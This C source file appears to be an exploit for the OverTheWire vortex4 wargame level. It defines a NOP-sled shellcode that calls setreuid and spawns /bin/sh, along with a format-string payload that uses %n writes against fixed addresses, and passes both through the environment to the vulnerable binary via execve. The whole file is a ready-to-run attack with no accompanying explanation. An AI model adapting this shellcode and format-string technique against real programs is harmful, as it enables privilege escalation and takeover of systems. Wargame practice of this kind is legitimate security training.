#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define PATH "/vortex/vortex4"

// Shellcode to spawn a shell
#define SHELLCODE "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x6a\x31\x58\xcd\x80\x89\xc3\x89\xd9\x6a\x46\x58\xcd\x80\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80\x6a\x01\x58\xcd\x80"

#define PAYLOAD "\x08\xc0\x04\x08\x09\xc0\x04\x08\x0a\xc0\x04\x08\x0b\xc0\x04\x08\x45\x45\x25\x31\x33\x38\x70\x25\x31\x32\x33\x24\x6e\x25\x30\x36\x37\x70\x25\x31\x32\x34\x24\x6e\x25\x30\x33\x32\x70\x25\x31\x32\x35\x24\x6e\x25\x32\x35\x36\x70\x25\x31\x32\x36\x24\x6e"

int main(int argc, char* argv[]) {
    char *args[] = {NULL};
    char *envp[] = {"", PAYLOAD, SHELLCODE, NULL};

    // Execute the vulnerable program
    execve(PATH, args, envp);

    // If execve fails, print an error message
    perror("execve");
    return 1;
}